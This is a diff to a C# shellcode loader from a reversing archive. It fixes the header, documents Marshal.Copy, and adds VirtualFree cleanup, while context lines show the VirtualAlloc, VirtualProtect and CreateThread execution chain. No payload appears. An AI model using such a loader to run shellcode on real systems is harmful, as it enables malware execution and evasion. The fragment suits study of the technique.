@@ -1,5 +1,5 @@
 /*
-    Shellcode oader
+    Shellcode Loader
     Archive of Reversing.ID
 
     storing payload in stack
@@ -10,6 +10,7 @@ Compile
 
 Technique:
     - allocation: VirtualAlloc
+    - writing:    Marshal.Copy
     - permission: VirtualProtect
     - execution:  CreateThread
 */
@@ -43,12 +44,15 @@ namespace ReversingID
             // make buffer executable
             th_shellcode = CreateThread (0, 0, runtime, IntPtr.Zero, 0, ref thread_id);
             WaitForSingleObject (th_shellcode, 0xffffffff);
+
+            VirtualFree (runtime, payload.Length, (int)State.MEM_RELEASE);
         }
         
         public enum State
         {
             MEM_COMMIT  = 0x1000,
             MEM_RESERVE = 0x2000,
+            MEM_RELEASE = 0x8000,
             MEM_FREE    = 0x10000
         }
 
@@ -68,6 +72,12 @@ namespace ReversingID
             uint size, 
             uint alloc_type, 
             uint protection);
+        
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr VirtualFree (
+            IntPtr lpAddress, 
+            int dwSize, 
+            int dwFreeType);
 
         [DllImport("kernel32.dll")]
         private static extern bool   VirtualProtect (
